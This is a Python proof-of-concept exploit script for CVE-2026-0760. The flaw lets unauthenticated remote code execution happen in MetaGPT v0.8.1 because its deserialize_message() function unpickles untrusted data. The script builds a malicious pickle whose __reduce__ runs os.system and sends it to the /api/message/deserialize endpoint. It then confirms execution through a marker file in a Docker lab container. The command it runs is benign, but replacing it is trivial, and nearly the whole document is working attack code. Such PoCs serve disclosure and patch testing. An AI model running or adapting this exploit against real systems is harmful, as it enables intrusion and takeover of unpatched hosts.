#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : MetaGPT deserialize_message() Pickle RCE (Network)
# CVE            : CVE-2026-0760
# Vendor         : deepwisdom (Foundation Agents)
# Product        : MetaGPT
# Affected       : v0.8.1 and all prior versions (UNPATCHED)
# Type           : CWE-502 - Deserialization of Untrusted Data
# CVSS           : 9.8 (Critical)
# Platform       : Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-03-01
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2026-0760 — Vector 1: Network HTTP Pickle RCE

Demonstrates CWE-502 (Deserialization of Untrusted Data) in MetaGPT v0.8.1.
The deserialize_message() function calls pickle.loads() directly on
user-supplied data, enabling arbitrary code execution.

ATTACK CHAIN:
  1. Craft a malicious pickle payload using Python's __reduce__ protocol
  2. Base64-encode the payload for HTTP transport
  3. Send it to /api/message/deserialize endpoint
  4. Verify RCE by checking for a marker file created by the payload

PREREQUISITES:
  - Network access to MetaGPT HTTP API (default port 8080)
  - No authentication required

REFERENCES:
  - CVE-2026-0760
  - https://www.zerodayinitiative.com/advisories/ZDI-26-026/
"""

import sys
import pickle
import base64
import os
import time
import json

# Use only stdlib — http.client for HTTP requests
import http.client
import subprocess


# ===========================================================================
# Step 1: Define the malicious pickle payload class
# ===========================================================================
# Python's pickle module uses the __reduce__ method to reconstruct objects.
# By overriding __reduce__, we can make pickle.loads() call ANY function
# with arbitrary arguments during deserialization — BEFORE any application
# validation occurs.

MARKER_FILE = "/tmp/cve-2026-0760-poc-proof.txt"
RCE_COMMAND = f"id > {MARKER_FILE} && echo 'EXPLOITED' >> {MARKER_FILE} && hostname >> {MARKER_FILE} && date >> {MARKER_FILE}"


class PickleRCE:
    """Malicious class that executes arbitrary commands when unpickled.

    When pickle.loads() encounters this object, it calls:
        os.system("id > /tmp/cve-2026-0760-poc-proof.txt && ...")
    This happens BEFORE the deserialized object is returned or validated.
    """
    def __reduce__(self):
        # __reduce__ returns a tuple: (callable, args)
        # pickle.loads() will execute: os.system(RCE_COMMAND)
        return (os.system, (RCE_COMMAND,))


def craft_payload():
    """Craft the malicious pickle payload.

    Returns:
        tuple: (raw_bytes, base64_encoded_string)
    """
    # Serialize our malicious object — this creates a valid pickle stream
    # that, when deserialized, calls os.system() with our command
    payload_bytes = pickle.dumps(PickleRCE())

    # Base64 encode for HTTP transport (the server expects base64)
    payload_b64 = base64.b64encode(payload_bytes).decode('ascii')

    return payload_bytes, payload_b64


def send_exploit(target_host, target_port, payload_b64):
    """Send the malicious payload to the vulnerable HTTP endpoint.

    The server's /api/message/deserialize endpoint:
    1. Receives base64-encoded data in JSON body
    2. Decodes the base64 to raw bytes
    3. Passes bytes to deserialize_message()
    4. deserialize_message() calls pickle.loads() — RCE occurs HERE
    5. Server returns 500 (expected, because os.system returns int, not Message)

    Args:
        target_host: Target IP/hostname
        target_port: Target port (default 8080)
        payload_b64: Base64-encoded pickle payload

    Returns:
        tuple: (status_code, response_body)
    """
    # Construct JSON body with the payload
    body = json.dumps({"data": payload_b64})

    try:
        conn = http.client.HTTPConnection(target_host, target_port, timeout=10)
        conn.request(
            "POST",
            "/api/message/deserialize",
            body=body,
            headers={"Content-Type": "application/json"}
        )
        response = conn.getresponse()
        status = response.status
        resp_body = response.read().decode('utf-8', errors='replace')
        conn.close()
        return status, resp_body
    except Exception as e:
        return None, str(e)


def verify_rce_via_docker(container_name):
    """Verify RCE by checking if the marker file was created inside the container.

    Args:
        container_name: Docker container name

    Returns:
        tuple: (success: bool, content: str)
    """
    try:
        result = subprocess.run(
            ["docker", "exec", container_name, "cat", MARKER_FILE],
            capture_output=True, text=True, timeout=5
        )
        if result.returncode == 0 and result.stdout.strip():
            return True, result.stdout.strip()
        else:
            return False, result.stderr.strip()
    except Exception as e:
        return False, str(e)


def cleanup_marker(container_name):
    """Remove the marker file from the container."""
    try:
        subprocess.run(
            ["docker", "exec", container_name, "rm", "-f", MARKER_FILE],
            capture_output=True, timeout=5
        )
    except Exception:
        pass


def exploit(target_host, target_port, container_name="cve-2026-0760-vulnerable"):
    """Run the full exploit chain against the target.

    Args:
        target_host: Target IP address or hostname
        target_port: Target HTTP port
        container_name: Docker container name for verification
    """
    print("=" * 70)
    print(f"  CVE-2026-0760 — MetaGPT deserialize_message() Pickle RCE PoC")
    print(f"  Vector: Network (HTTP POST to /api/message/deserialize)")
    print("=" * 70)
    print()

    # -----------------------------------------------------------------------
    # Step 1: Verify target is reachable and vulnerable service is running
    # -----------------------------------------------------------------------
    print(f"[*] Target: http://{target_host}:{target_port}")
    print("[*] Step 1: Checking target health...")

    try:
        conn = http.client.HTTPConnection(target_host, target_port, timeout=5)
        conn.request("GET", "/health")
        resp = conn.getresponse()
        health = json.loads(resp.read())
        conn.close()

        if health.get("vulnerable"):
            print(f"[+] Target is UP — vulnerable service confirmed")
        else:
            print(f"[-] Target responded but 'vulnerable' flag not set")
    except Exception as e:
        print(f"[-] Cannot reach target: {e}")
        sys.exit(1)

    # -----------------------------------------------------------------------
    # Step 2: Clean up any previous marker files
    # -----------------------------------------------------------------------
    print("[*] Step 2: Cleaning up previous proof artifacts...")
    cleanup_marker(container_name)

    # -----------------------------------------------------------------------
    # Step 3: Craft the malicious pickle payload
    # -----------------------------------------------------------------------
    print("[*] Step 3: Crafting malicious pickle payload...")
    payload_bytes, payload_b64 = craft_payload()
    print(f"    Payload size: {len(payload_bytes)} bytes (raw), {len(payload_b64)} chars (base64)")
    print(f"    RCE command: {RCE_COMMAND}")
    print(f"    Marker file: {MARKER_FILE}")

    # -----------------------------------------------------------------------
    # Step 4: Send the exploit payload via HTTP
    # -----------------------------------------------------------------------
    print("[*] Step 4: Sending payload to /api/message/deserialize...")
    status, resp_body = send_exploit(target_host, target_port, payload_b64)

    if status is None:
        print(f"[-] HTTP request failed: {resp_body}")
        sys.exit(1)

    print(f"    HTTP response: {status}")
    # HTTP 500 is EXPECTED — the pickle payload returns an int (from os.system),
    # not a Message object, so the server raises an AttributeError after RCE
    if status == 500:
        print(f"    [+] HTTP 500 is expected — RCE payload executes during pickle.loads()")
        print(f"        The error occurs AFTER code execution (int has no .instruct_content)")
    elif status == 200:
        print(f"    [+] HTTP 200 — payload executed and returned successfully")
    else:
        print(f"    [?] Unexpected status code: {status}")

    try:
        resp_json = json.loads(resp_body)
        print(f"    Response: {json.dumps(resp_json, indent=6)}")
    except json.JSONDecodeError:
        print(f"    Response: {resp_body[:200]}")

    # -----------------------------------------------------------------------
    # Step 5: Verify RCE occurred by checking the marker file
    # -----------------------------------------------------------------------
    print()
    print("[*] Step 5: Verifying RCE — checking marker file in container...")
    time.sleep(0.5)  # Brief pause for filesystem sync

    success, content = verify_rce_via_docker(container_name)

    if success:
        print(f"[+] ╔══════════════════════════════════════════════════════╗")
        print(f"[+] ║  RCE CONFIRMED — CVE-2026-0760 EXPLOITED            ║")
        print(f"[+] ╚══════════════════════════════════════════════════════╝")
        print(f"[+]")
        print(f"[+] Marker file contents ({MARKER_FILE}):")
        for line in content.split('\n'):
            print(f"[+]   {line}")
        print()
        print("[+] The pickle payload executed os.system() during deserialization,")
        print("[+] BEFORE any application-level validation could run.")
        print("[+] This demonstrates arbitrary command execution (CWE-502).")
    else:
        print(f"[-] ╔══════════════════════════════════════════════════════╗")
        print(f"[-] ║  VERIFICATION FAILED — marker file not found         ║")
        print(f"[-] ╚══════════════════════════════════════════════════════╝")
        print(f"[-] Error: {content}")
        sys.exit(1)

    print()
    print("=" * 70)
    print("  Exploit completed successfully.")
    print("=" * 70)


if __name__ == "__main__":
    # Default target: localhost (container port-mapped to host)
    target = sys.argv[1] if len(sys.argv) > 1 else "localhost"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
    container = sys.argv[3] if len(sys.argv) > 3 else "cve-2026-0760-vulnerable"

    exploit(target, port, container)
